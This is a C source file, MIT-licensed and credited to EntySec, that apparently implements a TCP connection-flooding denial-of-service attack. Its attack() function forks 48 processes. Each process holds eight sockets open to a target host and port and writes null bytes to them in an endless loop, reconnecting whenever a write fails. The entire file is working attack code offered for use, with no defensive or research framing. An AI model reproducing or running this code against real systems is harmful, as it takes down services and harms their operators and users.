/*
* MIT License
*
* Copyright (c) 2020-2021 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define CONNECTIONS 8
#define THREADS 48

static void block_pipes(int s)
{
    NULL;
}

static int connect_target(char *host, char *port)
{
    struct addrinfo hints, *servinfo, *p;
    int sock, r;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if ((r=getaddrinfo(host, port, &hints, &servinfo)) != 0)
        return -1;

    for (p = servinfo; p != NULL; p = p->ai_next) {
        if ((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1)
            continue;

        if (connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
            close(sock);
            continue;
        }

        break;
    }

    if (p == NULL) {
        if (servinfo)
            freeaddrinfo(servinfo);
        exit(0);
    }

    if (servinfo)
        freeaddrinfo(servinfo);

    return sock;
}

static void send_packets(char *host, char *port)
{
    int sockets[CONNECTIONS];
    int x, r;

    for (x = 0; x != CONNECTIONS; x++)
        sockets[x]=0;

    signal(SIGPIPE, &block_pipes);
    while (1) {
        for (x = 0; x != CONNECTIONS; x++) {
            if (sockets[x] == 0)
                sockets[x] = connect_target(host, port);

            r = write(sockets[x], "\0", 1);
            if (r == -1) {
                close(sockets[x]);
                sockets[x] = connect_target(host, port);
            }
        }

        usleep(300000);
    }
}

void attack(char *host, char *port)
{
    for (int x = 0; x != THREADS; x++) {
        if (fork())
            send_packets(host, port);
        usleep(200000);
    }
}
